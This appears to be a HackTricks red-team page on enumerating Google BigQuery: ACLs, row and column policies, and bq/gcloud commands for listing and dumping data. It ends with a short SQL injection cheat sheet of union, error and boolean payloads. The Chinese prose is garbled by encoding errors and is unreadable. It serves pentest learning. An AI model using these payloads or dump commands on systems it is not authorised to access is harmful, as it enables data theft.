# GCP - Bigquery Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

Google Cloud BigQuery æ˜¯ä¸€ä¸ª **å®Œå…¨æ‰˜ç®¡çš„æ— æœåŠ¡å™¨ä¼ä¸šæ•°æ®ä»“åº“**ï¼Œæä¾›å¯¹ **PB çº§æ•°æ®çš„åˆ†æ** èƒ½åŠ›ï¼Œä»è€Œé«˜æ•ˆå¤„ç†å¤§è§„æ¨¡æ•°æ®é›†ã€‚ä½œä¸ºä¸€ç§å¹³å°å³æœåŠ¡ï¼ˆPaaSï¼‰ï¼Œå®ƒä¸ºç”¨æˆ·æä¾›åŸºç¡€è®¾æ–½å’Œå·¥å…·ï¼Œä»¥ä¾¿åœ¨æ— éœ€æ‰‹åŠ¨ç›‘ç£çš„æƒ…å†µä¸‹ä¿ƒè¿›æ•°æ®ç®¡ç†ã€‚

å®ƒæ”¯æŒä½¿ç”¨ **ANSI SQL** è¿›è¡ŒæŸ¥è¯¢ã€‚ä¸»è¦å¯¹è±¡æ˜¯åŒ…å« SQL **æ•°æ®** çš„ **æ•°æ®é›†** å’Œ **è¡¨**ã€‚

### åŠ å¯†

é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨ **Google ç®¡ç†çš„åŠ å¯†å¯†é’¥**ï¼Œå°½ç®¡å¯ä»¥é…ç½® **å®¢æˆ·ç®¡ç†çš„åŠ å¯†å¯†é’¥ï¼ˆCMEKï¼‰**ã€‚å¯ä»¥åœ¨æ•°æ®é›†å’Œæ•°æ®é›†å†…çš„æ¯ä¸ªè¡¨ä¸­æŒ‡ç¤ºåŠ å¯†å¯†é’¥ã€‚

### è¿‡æœŸ

å¯ä»¥åœ¨ **æ•°æ®é›†** ä¸­æŒ‡ç¤º **è¿‡æœŸæ—¶é—´**ï¼Œå› æ­¤åœ¨æ­¤æ•°æ®é›†ä¸­åˆ›å»ºçš„ä»»ä½•æ–°è¡¨å°†åœ¨åˆ›å»ºåæŒ‡å®šçš„å¤©æ•°å†… **è‡ªåŠ¨åˆ é™¤**ã€‚

### å¤–éƒ¨æ¥æº

Bigquery ä¸å…¶ä»– Google æœåŠ¡æ·±åº¦é›†æˆã€‚å¯ä»¥ä»å­˜å‚¨æ¡¶ã€pub/subã€Google Driveã€RDS æ•°æ®åº“ç­‰åŠ è½½æ•°æ®...

### æ•°æ®é›† ACLs

å½“åˆ›å»ºæ•°æ®é›†æ—¶ï¼Œä¼šé™„åŠ  **ACLs** ä»¥æˆäºˆå¯¹å…¶çš„è®¿é—®æƒé™ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ**åˆ›å»º** æ•°æ®é›†çš„ **ç”¨æˆ·** æ‹¥æœ‰ **æ‰€æœ‰è€…** æƒé™ï¼Œç„¶å **é¡¹ç›®æ‰€æœ‰è€…** ç»„ï¼ˆé¡¹ç›®çš„æ‰€æœ‰è€…ï¼‰æ‹¥æœ‰ **æ‰€æœ‰è€…** æƒé™ï¼Œ**é¡¹ç›®å†™å…¥è€…** ç»„æ‹¥æœ‰ **å†™å…¥è€…** æƒé™ï¼Œ**é¡¹ç›®è¯»å–è€…** ç»„æ‹¥æœ‰ **è¯»å–è€…** æƒé™ï¼š
```bash
bq show --format=prettyjson <proj>:<dataset>

...
"access": [
{
"role": "WRITER",
"specialGroup": "projectWriters"
},
{
"role": "OWNER",
"specialGroup": "projectOwners"
},
{
"role": "OWNER",
"userByEmail": "gcp-admin@hacktricks.xyz"
},
{
"role": "OWNER",
"userByEmail": "support@hacktricks.xyz"
},
{
"role": "READER",
"specialGroup": "projectReaders"
}
],
...
```
### è¡¨è¡Œæ§åˆ¶è®¿é—®

å¯ä»¥é€šè¿‡è¡Œè®¿é—®ç­–ç•¥**æ§åˆ¶ä¸»ä½“åœ¨è¡¨å†…èƒ½å¤Ÿè®¿é—®çš„è¡Œ**ã€‚è¿™äº›ç­–ç•¥åœ¨è¡¨å†…ä½¿ç”¨ [**DDL**](https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create\_row\_access\_policy\_statement) å®šä¹‰ã€‚\
è®¿é—®ç­–ç•¥å®šä¹‰äº†ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œ**åªæœ‰ä¸è¯¥è¿‡æ»¤å™¨åŒ¹é…çš„è¡Œ**æ‰ä¼šè¢«æŒ‡å®šçš„ä¸»ä½“**è®¿é—®**ã€‚
```sql
# Create
CREATE ROW ACCESS POLICY apac_filter
ON project.dataset.my_table
GRANT TO ('user:abc@example.com')
FILTER USING (region = 'APAC');

# Update
CREATE OR REPLACE ROW ACCESS POLICY
CREATE ROW ACCESS POLICY sales_us_filter
ON project.dataset.my_table
GRANT TO ('user:john@example.com',
'group:sales-us@example.com',
'group:sales-managers@example.com')
FILTER USING (region = 'US');

# Check the Post Exploitation tricks to see how to call this from the cli
```

```bash
# Enumerate row policies on a table
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies
```
### åˆ—è®¿é—®æ§åˆ¶

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

è¦åœ¨åˆ—çº§åˆ«é™åˆ¶æ•°æ®è®¿é—®ï¼š

1. **å®šä¹‰åˆ†ç±»æ³•å’Œç­–ç•¥æ ‡ç­¾**ã€‚ä¸ºæ‚¨çš„æ•°æ®åˆ›å»ºå’Œç®¡ç†åˆ†ç±»æ³•å’Œç­–ç•¥æ ‡ç­¾ã€‚ [https://console.cloud.google.com/bigquery/policy-tags](https://console.cloud.google.com/bigquery/policy-tags)
2. å¯é€‰ï¼šå°† **æ•°æ®ç›®å½•ç»†ç²’åº¦è¯»å–è€…è§’è‰²æˆäºˆä¸€ä¸ªæˆ–å¤šä¸ªä¸»ä½“**ï¼Œé’ˆå¯¹æ‚¨åˆ›å»ºçš„ä¸€ä¸ªæˆ–å¤šä¸ªç­–ç•¥æ ‡ç­¾ã€‚
3. **å°†ç­–ç•¥æ ‡ç­¾åˆ†é…ç»™æ‚¨çš„ BigQuery åˆ—**ã€‚åœ¨ BigQuery ä¸­ï¼Œä½¿ç”¨æ¨¡å¼æ³¨é‡Šå°†ç­–ç•¥æ ‡ç­¾åˆ†é…ç»™æ‚¨å¸Œæœ›é™åˆ¶è®¿é—®çš„æ¯ä¸€åˆ—ã€‚
4. **åœ¨åˆ†ç±»æ³•ä¸Šå¼ºåˆ¶è®¿é—®æ§åˆ¶**ã€‚å¼ºåˆ¶è®¿é—®æ§åˆ¶ä¼šå¯¼è‡´å¯¹åˆ†ç±»æ³•ä¸­æ‰€æœ‰ç­–ç•¥æ ‡ç­¾å®šä¹‰çš„è®¿é—®é™åˆ¶ç”Ÿæ•ˆã€‚
5. **ç®¡ç†ç­–ç•¥æ ‡ç­¾çš„è®¿é—®**ã€‚ä½¿ç”¨ [èº«ä»½å’Œè®¿é—®ç®¡ç†](https://cloud.google.com/iam) (IAM) ç­–ç•¥é™åˆ¶å¯¹æ¯ä¸ªç­–ç•¥æ ‡ç­¾çš„è®¿é—®ã€‚è¯¥ç­–ç•¥å¯¹å±äºè¯¥ç­–ç•¥æ ‡ç­¾çš„æ¯ä¸€åˆ—æœ‰æ•ˆã€‚

å½“ç”¨æˆ·å°è¯•åœ¨æŸ¥è¯¢æ—¶è®¿é—®åˆ—æ•°æ®æ—¶ï¼ŒBigQuery **æ£€æŸ¥åˆ—ç­–ç•¥æ ‡ç­¾åŠå…¶ç­–ç•¥ï¼Œä»¥æŸ¥çœ‹ç”¨æˆ·æ˜¯å¦è¢«æˆæƒè®¿é—®æ•°æ®**ã€‚

{% hint style="success" %}
ä½œä¸ºæ€»ç»“ï¼Œè¦é™åˆ¶æŸäº›ç”¨æˆ·å¯¹æŸäº›åˆ—çš„è®¿é—®ï¼Œæ‚¨å¯ä»¥ **åœ¨æ¨¡å¼ä¸­ä¸ºåˆ—æ·»åŠ æ ‡ç­¾å¹¶é™åˆ¶ç”¨æˆ·å¯¹è¯¥æ ‡ç­¾çš„è®¿é—®**ï¼Œé€šè¿‡åœ¨æ ‡ç­¾çš„åˆ†ç±»æ³•ä¸Šå¼ºåˆ¶è®¿é—®æ§åˆ¶ã€‚
{% endhint %}

è¦åœ¨åˆ†ç±»æ³•ä¸Šå¼ºåˆ¶è®¿é—®æ§åˆ¶ï¼Œéœ€è¦å¯ç”¨è¯¥æœåŠ¡ï¼š
```bash
gcloud services enable bigquerydatapolicy.googleapis.com
```
å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æŸ¥çœ‹åˆ—çš„æ ‡ç­¾ï¼š

{% code overflow="wrap" %}
```bash
bq show --schema <proj>:<dataset>.<table>

[{"name":"username","type":"STRING","mode":"NULLABLE","policyTags":{"names":["projects/.../locations/us/taxonomies/2030629149897327804/policyTags/7703453142914142277"]},"maxLength":"20"},{"name":"age","type":"INTEGER","mode":"NULLABLE"}]
```
{% endcode %}

### æšä¸¾

{% code overflow="wrap" %}
```bash
# Dataset info
bq ls # List datasets
bq ls -a # List all datasets (even hidden)
bq ls <proj>:<dataset> # List tables in a dataset
bq show --format=prettyjson <proj>:<dataset> # Get info about the dataset (like ACLs)

# Tables info
bq show --format=prettyjson <proj>:<dataset>.<table> # Get table info
bq show --schema <proj>:<dataset>.<table>  # Get schema of a table

# Get entries from the table
bq head <dataset>.<table>
bq query --nouse_legacy_sql 'SELECT * FROM `<proj>.<dataset>.<table-name>` LIMIT 1000'
bq extract <dataset>.<table> "gs://<bucket>/table*.csv" # Use the * so it can dump everything in different files

# Insert data
bq query --nouse_legacy_sql 'INSERT INTO `digital-bonfire-410512.importeddataset.tabletest` (rank, refresh_date, dma_name, dma_id, term, week, score) VALUES (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2019-10-13", 62), (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2020-05-24", 67)'
bq insert dataset.table /tmp/mydata.json

# Get permissions
bq get-iam-policy <proj>:<dataset> # Get dataset IAM policy
bq show --format=prettyjson <proj>:<dataset> # Get dataset ACLs
bq get-iam-policy <proj>:<dataset>.<table> # Get table IAM policy
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies

# Taxonomies (Get the IDs from the shemas of the tables)
gcloud data-catalog taxonomies describe <taxonomi-ID> --location=<location>
gcloud data-catalog taxonomies list --location <location> #Find more
gcloud data-catalog taxonomies get-iam-policy <taxonomi-ID> --location=<location>

# Get jobs executed
bq ls --jobs=true --all=true
bq show --location=<location> show --format=prettyjson --job=true <job-id>

# Misc
bq show --encryption_service_account # Get encryption service account
```
{% endcode %}

### BigQuery SQL æ³¨å…¥

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹åšå®¢æ–‡ç« ï¼š[https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)ã€‚è¿™é‡Œä»…æä¾›ä¸€äº›ç»†èŠ‚ã€‚

**æ³¨é‡Š**ï¼š

* `select 1#from here it is not working`
* `select 1/*between those it is not working*/` ä½†ä»…åˆå§‹çš„ä¸ä¼šå·¥ä½œ
* `select 1--from here it is not working`

è·å– **ç¯å¢ƒ** çš„ **ä¿¡æ¯**ï¼Œä¾‹å¦‚ï¼š

* å½“å‰ç”¨æˆ·ï¼š`select session_user()`
* é¡¹ç›® IDï¼š`select @@project_id`

è¿æ¥è¡Œï¼š

* æ‰€æœ‰è¡¨åï¼š`string_agg(table_name, ', ')`

è·å– **æ•°æ®é›†**ã€**è¡¨** å’Œ **åˆ—** åç§°ï¼š

* **é¡¹ç›®** å’Œ **æ•°æ®é›†** åç§°ï¼š

{% code overflow="wrap" %}
```sql
SELECT catalog_name, schema_name FROM INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

* **æ‰€æœ‰æ•°æ®é›†**çš„ **åˆ—** å’Œ **è¡¨** åç§°ï¼š

{% code overflow="wrap" %}
```sql
# SELECT table_name, column_name FROM <proj-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS

SELECT table_name, column_name FROM <project-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS
```
{% endcode %}

* **åŒä¸€é¡¹ç›®ä¸­çš„å…¶ä»–æ•°æ®é›†**:

{% code overflow="wrap" %}
```sql
#Â SELECT catalog_name, schema_name, FROM <proj-name>.INFORMATION_SCHEMA.SCHEMATA

SELECT catalog_name, schema_name, NULL FROM <project-name>.INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

**SQL æ³¨å…¥ç±»å‹ï¼š**

* åŸºäºé”™è¯¯ - ç±»å‹è½¬æ¢ï¼š `select CAST(@@project_id AS INT64)`
* åŸºäºé”™è¯¯ - é™¤ä»¥é›¶ï¼š `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`
* åŸºäºè”åˆï¼ˆåœ¨ bigquery ä¸­éœ€è¦ä½¿ç”¨ ALLï¼‰ï¼š `UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#`
* åŸºäºå¸ƒå°”å€¼ï¼š ``' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#``
* æ½œåœ¨åŸºäºæ—¶é—´ - ä½¿ç”¨å…¬å…±æ•°æ®é›†ç¤ºä¾‹ï¼š ``SELECT * FROM `bigquery-public-data.covid19_open_data.covid19_open_data` LIMIT 1000``

**æ–‡æ¡£ï¼š**

* æ‰€æœ‰å‡½æ•°åˆ—è¡¨ï¼š[https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* è„šæœ¬è¯­å¥ï¼š[https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting](https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting)

### æƒé™æå‡ä¸åæœŸåˆ©ç”¨

{% content-ref url="../gcp-privilege-escalation/gcp-bigquery-privesc.md" %}
[gcp-bigquery-privesc.md](../gcp-privilege-escalation/gcp-bigquery-privesc.md)
{% endcontent-ref %}

### æŒä¹…æ€§

{% content-ref url="../gcp-persistence/gcp-bigquery-persistence.md" %}
[gcp-bigquery-persistence.md](../gcp-persistence/gcp-bigquery-persistence.md)
{% endcontent-ref %}

## å‚è€ƒ

* [https://cloud.google.com/bigquery/docs/column-level-security-intro](https://cloud.google.com/bigquery/docs/column-level-security-intro)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
